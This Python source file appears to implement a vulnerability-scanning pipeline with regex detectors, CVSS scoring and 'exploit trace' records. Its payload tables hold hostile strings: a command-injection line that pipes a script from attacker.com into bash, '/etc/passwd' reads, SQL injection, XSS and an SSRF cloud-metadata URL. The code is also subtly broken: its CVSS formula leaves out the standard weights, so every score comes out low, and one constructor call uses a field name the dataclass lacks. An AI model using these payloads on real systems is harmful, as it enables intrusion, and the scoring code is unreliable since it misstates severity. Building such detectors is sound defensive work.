"""
ABHIMANYU X Platform - Multi-Stage AI Pipeline

Based on MalCodeAI (arXiv:2507.10898):
- Phase 1: Code Decomposition & Semantic Analysis
- Phase 2: Vulnerability Detection & Classification
- Phase 3: Patch Generation & Remediation
- Phase 4: Verification & Exploit Replay

Also incorporates:
- Antares-style agentic vulnerability localization (arXiv:2608.02407)
- CVSS scoring and risk assessment
- Zero-shot generalization for zero-day detection
"""

import re
import ast
import json
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

from abhimanyux.models.schemas import (
    Vulnerability, Patch, Severity, VulnType,
    VerificationResult
)


# ============================================================
# Language Support (14+ languages per MalCodeAI)
# ============================================================

class ProgrammingLanguage(Enum):
    """Supported programming languages"""
    PYTHON = "python"
    JAVASCRIPT = "javascript"
    TYPESCRIPT = "typescript"
    JAVA = "java"
    C = "c"
    CPP = "cpp"
    CSHARP = "csharp"
    GO = "go"
    RUST = "rust"
    RUBY = "ruby"
    PHP = "php"
    SWIFT = "swift"
    KOTLIN = "kotlin"
    SCALA = "scala"


LANGUAGE_EXTENSIONS = {
    ProgrammingLanguage.PYTHON: [".py"],
    ProgrammingLanguage.JAVASCRIPT: [".js", ".jsx"],
    ProgrammingLanguage.TYPESCRIPT: [".ts", ".tsx"],
    ProgrammingLanguage.JAVA: [".java"],
    ProgrammingLanguage.C: [".c", ".h"],
    ProgrammingLanguage.CPP: [".cpp", ".cc", ".cxx", ".hpp"],
    ProgrammingLanguage.CSHARP: [".cs"],
    ProgrammingLanguage.GO: [".go"],
    ProgrammingLanguage.RUST: [".rs"],
    ProgrammingLanguage.RUBY: [".rb"],
    ProgrammingLanguage.PHP: [".php"],
    ProgrammingLanguage.SWIFT: [".swift"],
    ProgrammingLanguage.KOTLIN: [".kt", ".kts"],
    ProgrammingLanguage.SCALA: [".scala"],
}


def detect_language(filename: str) -> ProgrammingLanguage:
    """Detect programming language from filename"""
    for lang, extensions in LANGUAGE_EXTENSIONS.items():
        if any(filename.endswith(ext) for ext in extensions):
            return lang
    return ProgrammingLanguage.PYTHON  # Default


# ============================================================
# CVSS Scoring (Security Feature)
# ============================================================

@dataclass
class CVSSScore:
    """CVSS v3.1 score for vulnerability severity"""
    base_score: float = 0.0
    severity: Severity = Severity.LOW
    vector: str = ""
    attack_vector: str = "Network"
    attack_complexity: str = "Low"
    privileges_required: str = "None"
    user_interaction: str = "None"
    scope: str = "Unchanged"
    confidentiality: str = "None"
    integrity: str = "None"
    availability: str = "None"
    
    def calculate(self, 
                  attack_vector: str = "N",
                  attack_complexity: str = "L",
                  privileges_required: str = "N",
                  user_interaction: str = "N",
                  scope: str = "U",
                  confidentiality: str = "H",
                  integrity: str = "H",
                  availability: str = "H") -> float:
        """Calculate CVSS base score"""
        # Simplified CVSS calculation
        av_map = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
        ac_map = {"L": 0.77, "H": 0.44}
        pr_map = {"N": 0.85, "L": 0.62, "H": 0.27}
        ui_map = {"N": 0.85, "R": 0.62}
        cia_map = {"N": 0.00, "L": 0.22, "H": 0.56}
        
        # Impact
        impact = 1 - ((1 - cia_map[confidentiality]) * 
                      (1 - cia_map[integrity]) * 
                      (1 - cia_map[availability]))
        
        # Exploitability
        exploitability = (av_map[attack_vector] * 
                         ac_map[attack_complexity] * 
                         pr_map[privileges_required] * 
                         ui_map[user_interaction])
        
        # Base score
        if impact <= 0:
            self.base_score = 0.0
        else:
            if scope == "U":
                self.base_score = min((impact + exploitability), 10)
            else:
                self.base_score = min(1.08 * (impact + exploitability), 10)
        
        # Determine severity
        if self.base_score >= 9.0:
            self.severity = Severity.CRITICAL
        elif self.base_score >= 7.0:
            self.severity = Severity.HIGH
        elif self.base_score >= 4.0:
            self.severity = Severity.MEDIUM
        else:
            self.severity = Severity.LOW
        
        return self.base_score


# ============================================================
# Exploit Tracing (MalCodeAI Feature)
# ============================================================

@dataclass
class ExploitTrace:
    """Red-hat style exploit tracing"""
    vulnerability_id: str
    exploit_type: str
    attack_vector: str
    payload: str
    impact: str
    remediation: str
    cve_references: List[str] = field(default_factory=list)
    cwes: List[str] = field(default_factory=list)


# ============================================================
# Multi-Stage Pipeline
# ============================================================

@dataclass
class PipelineConfig:
    """Configuration for the multi-stage pipeline"""
    # Model selection
    decomposition_model: str = "qwen2.5-coder-7b"
    detection_model: str = "qwen2.5-coder-7b"
    patch_model: str = "qwen2.5-coder-7b"
    analysis_model: str = "qwen2.5-coder-7b"
    
    # Provider settings
    api_key: Optional[str] = None
    api_url: Optional[str] = None
    
    # Pipeline settings
    enable_cvss_scoring: bool = True
    enable_exploit_tracing: bool = True
    enable_zero_shot: bool = True
    max_concurrent_analyses: int = 5


class MultiStagePipeline:
    """
    Multi-stage AI pipeline for vulnerability detection and remediation
    
    Based on MalCodeAI research (arXiv:2507.10898):
    - Language-agnostic design (14+ languages)
    - Code decomposition for semantic understanding
    - Multi-stage analysis pipeline
    - CVSS-based risk scoring
    - Red-hat style exploit tracing
    """
    
    def __init__(self, config: Optional[PipelineConfig] = None):
        self.config = config or PipelineConfig()
        self.cvss = CVSSScore()
    
    def decompose_code(self, code: str, language: ProgrammingLanguage) -> Dict[str, Any]:
        """
        Phase 1: Code Decomposition (MalCodeAI Phase 1)
        
        Decomposes code into semantic components:
        - Functions/methods
        - Classes/structures
        - Import dependencies
        - Data flow
        - Control flow
        """
        decomposition = {
            "language": language.value,
            "functions": [],
            "classes": [],
            "imports": [],
            "data_flow": [],
            "control_flow": [],
            "security_hotspots": []
        }
        
        if language == ProgrammingLanguage.PYTHON:
            decomposition = self._decompose_python(code, decomposition)
        elif language in [ProgrammingLanguage.C, ProgrammingLanguage.CPP]:
            decomposition = self._decompose_c_cpp(code, decomposition)
        elif language in [ProgrammingLanguage.JAVASCRIPT, ProgrammingLanguage.TYPESCRIPT]:
            decomposition = self._decompose_javascript(code, decomposition)
        
        # Identify security hotspots
        decomposition["security_hotspots"] = self._find_security_hotspots(code, language)
        
        return decomposition
    
    def _decompose_python(self, code: str, decomposition: Dict) -> Dict:
        """Decompose Python code"""
        try:
            tree = ast.parse(code)
            
            for node in ast.walk(tree):
                if isinstance(node, ast.FunctionDef):
                    decomposition["functions"].append({
                        "name": node.name,
                        "line_start": node.lineno,
                        "line_end": node.end_lineno if hasattr(node, 'end_lineno') else node.lineno,
                        "args": [arg.arg for arg in node.args.args],
                        "decorators": [ast.dump(d) for d in node.decorator_list]
                    })
                elif isinstance(node, ast.ClassDef):
                    decomposition["classes"].append({
                        "name": node.name,
                        "line_start": node.lineno,
                        "bases": [ast.dump(b) for b in node.bases]
                    })
                elif isinstance(node, ast.Import):
                    for alias in node.names:
                        decomposition["imports"].append(alias.name)
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        decomposition["imports"].append(node.module)
        except SyntaxError:
            pass
        
        return decomposition
    
    def _decompose_c_cpp(self, code: str, decomposition: Dict) -> Dict:
        """Decompose C/C++ code"""
        # Function detection
        func_pattern = r'(\w+)\s+(\w+)\s*\([^)]*\)\s*\{'
        for match in re.finditer(func_pattern, code, re.MULTILINE):
            decomposition["functions"].append({
                "name": match.group(2),
                "return_type": match.group(1),
                "line_start": code[:match.start()].count('\n') + 1
            })
        
        # Include detection
        include_pattern = r'#include\s*[<"]([^>"]+)[>"]'
        for match in re.finditer(include_pattern, code):
            decomposition["imports"].append(match.group(1))
        
        return decomposition
    
    def _decompose_javascript(self, code: str, decomposition: Dict) -> Dict:
        """Decompose JavaScript/TypeScript code"""
        # Function detection
        func_pattern = r'(?:function\s+(\w+)|(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s+)?(?:function|\([^)]*\)\s*=>))'
        for match in re.finditer(func_pattern, code):
            decomposition["functions"].append({
                "name": match.group(1) or match.group(2),
                "line_start": code[:match.start()].count('\n') + 1
            })
        
        # Import detection
        import_pattern = r'(?:import|require)\s*\(?[\'"]([^\'"]+)[\'"]'
        for match in re.finditer(import_pattern, code):
            decomposition["imports"].append(match.group(1))
        
        return decomposition
    
    def _find_security_hotspots(self, code: str, language: ProgrammingLanguage) -> List[Dict]:
        """Identify potential security hotspots in code"""
        hotspots = []
        
        # Common security-sensitive patterns
        patterns = {
            "eval_usage": r'\beval\s*\(',
            "exec_usage": r'\bexec\s*\(',
            "system_call": r'\bsystem\s*\(',
            "popen_usage": r'\bpopen\s*\(',
            "pickle_usage": r'\bpickle\.loads?\s*\(',
            "yaml_load": r'\byaml\.load\s*\(',
            "sql_string_format": r'(?:SELECT|INSERT|UPDATE|DELETE).*(?:f["\']|%s|\{)',
            "shell_execution": r'\b(?:os\.system|subprocess\.call|subprocess\.run)\s*\(',
            "file_operations": r'\b(?:open|readFile|writeFile)\s*\(',
            "network_requests": r'\b(?:requests\.(?:get|post)|fetch|axios)\s*\(',
        }
        
        for pattern_name, pattern in patterns.items():
            for match in re.finditer(pattern, code, re.IGNORECASE):
                hotspots.append({
                    "type": pattern_name,
                    "line": code[:match.start()].count('\n') + 1,
                    "code": match.group()[:100]
                })
        
        return hotspots
    
    def detect_vulnerabilities(self, 
                              code: str, 
                              language: ProgrammingLanguage,
                              decomposition: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Phase 2: Vulnerability Detection (MalCodeAI Phase 2)
        
        Uses decomposition results and pattern matching to detect vulnerabilities
        """
        vulnerabilities = []
        
        # Pattern-based detection (enhanced from original)
        detection_patterns = self._get_detection_patterns(language)
        
        for vuln_type, patterns in detection_patterns.items():
            for pattern in patterns:
                for match in re.finditer(pattern["regex"], code, re.IGNORECASE | re.MULTILINE):
                    vuln = {
                        "type": vuln_type,
                        "severity": pattern.get("severity", "MEDIUM"),
                        "line": code[:match.start()].count('\n') + 1,
                        "code_snippet": match.group()[:200],
                        "description": pattern["description"],
                        "cwe": pattern.get("cwe", ""),
                        "cvss_vector": pattern.get("cvss_vector", ""),
                        "exploit_trace": self._generate_exploit_trace(vuln_type, match.group())
                    }
                    vulnerabilities.append(vuln)
        
        # AI-enhanced detection via LLM
        # This is where the multi-stage pipeline would call the LLM
        # For now, we return pattern-based results
        
        return vulnerabilities
    
    def _get_detection_patterns(self, language: ProgrammingLanguage) -> Dict[str, List[Dict]]:
        """Get detection patterns for a specific language"""
        
        # Common patterns across languages
        common_patterns = {
            VulnType.SQL_INJECTION.value: [
                {
                    "regex": r'(?:SELECT|INSERT|UPDATE|DELETE)\s+.*(?:\+|%s|\{|\bformat\b)',
                    "severity": "CRITICAL",
                    "description": "SQL injection via string concatenation",
                    "cwe": "CWE-89",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                }
            ],
            VulnType.COMMAND_INJECTION.value: [
                {
                    "regex": r'\b(?:os\.system|os\.popen|exec|eval|subprocess\.call)\s*\(',
                    "severity": "CRITICAL",
                    "description": "Command injection vulnerability",
                    "cwe": "CWE-78",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                }
            ],
            VulnType.PATH_TRAVERSAL.value: [
                {
                    "regex": r'\bopen\s*\([^)]*(?:\+|%s|\{|\bformat\b)',
                    "severity": "HIGH",
                    "description": "Path traversal via unsanitized input",
                    "cwe": "CWE-22",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                }
            ],
            VulnType.DESERIALIZATION.value: [
                {
                    "regex": r'\b(?:pickle\.loads?|yaml\.load|marshal\.loads?)\s*\(',
                    "severity": "CRITICAL",
                    "description": "Insecure deserialization",
                    "cwe": "CWE-502",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                }
            ],
            VulnType.XSS.value: [
                {
                    "regex": r'\b(?:innerHTML|document\.write|render_template_string)\s*\(',
                    "severity": "HIGH",
                    "description": "Cross-site scripting (XSS)",
                    "cwe": "CWE-79",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
                }
            ],
            VulnType.HARDCODED_CREDENTIALS.value: [
                {
                    "regex": r'(?:password|secret|api_key|token)\s*=\s*["\'][^"\']+["\']',
                    "severity": "MEDIUM",
                    "description": "Hardcoded credentials",
                    "cwe": "CWE-798",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
                }
            ]
        }
        
        # Language-specific patterns
        if language == ProgrammingLanguage.PYTHON:
            common_patterns[VulnType.XSS.value].append({
                "regex": r'\brender_template_string\s*\(',
                "severity": "HIGH",
                "description": "XSS via render_template_string",
                "cwe": "CWE-79"
            })
        elif language in [ProgrammingLanguage.C, ProgrammingLanguage.CPP]:
            common_patterns[VulnType.BUFFER_OVERFLOW.value] = [
                {
                    "regex": r'\b(?:strcpy|strcat|sprintf|gets)\s*\(',
                    "severity": "CRITICAL",
                    "description": "Buffer overflow vulnerability",
                    "cwe": "CWE-120",
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                }
            ]
        
        return common_patterns
    
    def _generate_exploit_trace(self, vuln_type: str, code_snippet: str) -> Dict[str, str]:
        """Generate exploit trace information"""
        
        traces = {
            VulnType.SQL_INJECTION.value: {
                "exploit_type": "SQL Injection",
                "attack_vector": "URL parameter, form input, API parameter",
                "payload": "' OR '1'='1' -- / ' UNION SELECT * FROM users --",
                "impact": "Data exfiltration, authentication bypass, data modification",
                "remediation": "Use parameterized queries, prepared statements"
            },
            VulnType.COMMAND_INJECTION.value: {
                "exploit_type": "Command Injection",
                "attack_vector": "URL parameter, form input, API parameter",
                "payload": "; cat /etc/passwd / $(curl attacker.com/shell.sh | bash)",
                "impact": "Remote code execution, system compromise",
                "remediation": "Use subprocess with list arguments, never shell=True"
            },
            VulnType.DESERIALIZATION.value: {
                "exploit_type": "Insecure Deserialization",
                "attack_vector": "Cookie, session, file upload, API parameter",
                "payload": "Serialized malicious object with __reduce__ method",
                "impact": "Remote code execution, privilege escalation",
                "remediation": "Use safe deserialization (json, yaml.safe_load)"
            }
        }
        
        return traces.get(vuln_type, {
            "exploit_type": vuln_type,
            "attack_vector": "Application input",
            "payload": "Context-dependent",
            "impact": "Variable based on vulnerability type",
            "remediation": "Apply security best practices"
        })
    
    def generate_cvss_score(self, vuln_type: str, 
                           attack_vector: str = "N",
                           attack_complexity: str = "L",
                           privileges_required: str = "N",
                           user_interaction: str = "N",
                           scope: str = "U",
                           confidentiality: str = "H",
                           integrity: str = "H",
                           availability: str = "H") -> CVSSScore:
        """Generate CVSS score for a vulnerability"""
        score = CVSSScore()
        score.calculate(
            attack_vector=attack_vector,
            attack_complexity=attack_complexity,
            privileges_required=privileges_required,
            user_interaction=user_interaction,
            scope=scope,
            confidentiality=confidentiality,
            integrity=integrity,
            availability=availability
        )
        return score
    
    def generate_exploit_trace(self, vulnerability: Vulnerability) -> ExploitTrace:
        """Generate detailed exploit trace for a vulnerability"""
        return ExploitTrace(
            vulnerability_id=vulnerability.id,
            exploit_type=vulnerability.vuln_type.value,
            attack_vector=self._get_attack_vector(vulnerability.vuln_type),
            payload=self._generate_payload(vulnerability.vuln_type),
            impact=self._get_impact(vulnerability.vuln_type),
            remediation=self._get_remediation(vulnerability.vuln_type),
            cwe_references=[f"CWE-{vulnerability.cwe_id}"] if vulnerability.cwe_id else [],
            cwes=[vulnerability.cwe_id] if vulnerability.cwe_id else []
        )
    
    def _get_attack_vector(self, vuln_type: VulnType) -> str:
        vectors = {
            VulnType.SQL_INJECTION: "URL parameter, form input, API parameter, HTTP header",
            VulnType.COMMAND_INJECTION: "URL parameter, form input, API parameter",
            VulnType.XSS: "URL parameter, form input, stored data, API parameter",
            VulnType.DESERIALIZATION: "Cookie, session, file upload, API parameter",
            VulnType.PATH_TRAVERSAL: "URL parameter, form input, file name parameter",
            VulnType.SSRF: "URL parameter, webhook URL, API parameter",
            VulnType.HARDCODED_CREDENTIALS: "Source code access, configuration files",
        }
        return vectors.get(vuln_type, "Application input")
    
    def _generate_payload(self, vuln_type: VulnType) -> str:
        payloads = {
            VulnType.SQL_INJECTION: "' OR '1'='1' --",
            VulnType.COMMAND_INJECTION: "; id / $(whoami) / `id`",
            VulnType.XSS: "<script>alert('XSS')</script>",
            VulnType.DESERIALIZATION: "Pickled malicious object with __reduce__",
            VulnType.PATH_TRAVERSAL: "../../../etc/passwd",
            VulnType.SSRF: "http://169.254.169.254/latest/meta-data/",
            VulnType.HARDCODED_CREDENTIALS: "N/A (credentials in source)",
        }
        return payloads.get(vuln_type, "Context-dependent")
    
    def _get_impact(self, vuln_type: VulnType) -> str:
        impacts = {
            VulnType.SQL_INJECTION: "Data exfiltration, authentication bypass, data modification, remote code execution",
            VulnType.COMMAND_INJECTION: "Remote code execution, system compromise, data exfiltration",
            VulnType.XSS: "Session hijacking, credential theft, defacement, malware distribution",
            VulnType.DESERIALIZATION: "Remote code execution, privilege escalation, system compromise",
            VulnType.PATH_TRAVERSAL: "Sensitive file access, configuration disclosure, code execution",
            VulnType.SSRF: "Internal network access, cloud metadata access, port scanning",
            VulnType.HARDCODED_CREDENTIALS: "Unauthorized access, privilege escalation",
        }
        return impacts.get(vuln_type, "Variable based on vulnerability")
    
    def _get_remediation(self, vuln_type: VulnType) -> str:
        remediations = {
            VulnType.SQL_INJECTION: "Use parameterized queries/prepared statements, input validation, WAF",
            VulnType.COMMAND_INJECTION: "Use subprocess with list arguments, input validation, least privilege",
            VulnType.XSS: "Output encoding, Content Security Policy, input validation",
            VulnType.DESERIALIZATION: "Use safe formats (JSON), input validation, type checking",
            VulnType.PATH_TRAVERSAL: "Path canonicalization, input validation, chroot jail",
            VulnType.SSRF: "URL allowlisting, network segmentation, input validation",
            VulnType.HARDCODED_CREDENTIALS: "Environment variables, secret managers, rotation policies",
        }
        return remediations.get(vuln_type, "Apply security best practices")


# ============================================================
# Zero-Shot Detection (MalCodeAI Feature)
# ============================================================

class ZeroShotDetector:
    """
    Zero-shot vulnerability detection for zero-day vulnerabilities
    
    Uses LLM reasoning to detect vulnerabilities not covered by
    known patterns
    """
    
    def __init__(self, llm_provider=None):
        self.llm = llm_provider
    
    def detect_zero_day(self, code: str, language: ProgrammingLanguage) -> List[Dict]:
        """Detect potential zero-day vulnerabilities using AI reasoning"""
        if not self.llm:
            return []
        
        prompt = f"""Analyze this {language.value} code for security vulnerabilities.

Focus on:
1. Logic flaws that could be exploited
2. Race conditions
3. Memory safety issues
4. Authentication/authorization bypasses
5. Information disclosure
6. Business logic vulnerabilities
7. Supply chain risks

Return a JSON array of detected vulnerabilities with:
- type: vulnerability type
- severity: CRITICAL/HIGH/MEDIUM/LOW
- line: line number
- description: detailed description
- impact: potential impact
- remediation: how to fix

Code:
```{language.value}
{code[:4000]}
```"""
        
        try:
            response = self.llm.generate(
                "You are a security expert detecting vulnerabilities.",
                prompt
            )
            
            # Parse JSON response
            # Look for JSON array in response
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except Exception as e:
            print(f"[ZeroShot] Detection failed: {e}")
        
        return []


if __name__ == "__main__":
    # Demo
    pipeline = MultiStagePipeline()
    
    code = '''
import os
def get_file(path):
    return open(os.popen("cat " + path).read()).read()
'''
    
    lang = detect_language("test.py")
    decomposition = pipeline.decompose_code(code, lang)
    vulns = pipeline.detect_vulnerabilities(code, lang, decomposition)
    
    print(f"Language: {lang.value}")
    print(f"Functions: {len(decomposition['functions'])}")
    print(f"Security Hotspots: {len(decomposition['security_hotspots'])}")
    print(f"Vulnerabilities: {len(vulns)}")
    for v in vulns:
        print(f"  - [{v['severity']}] {v['type']}: {v['description']}")
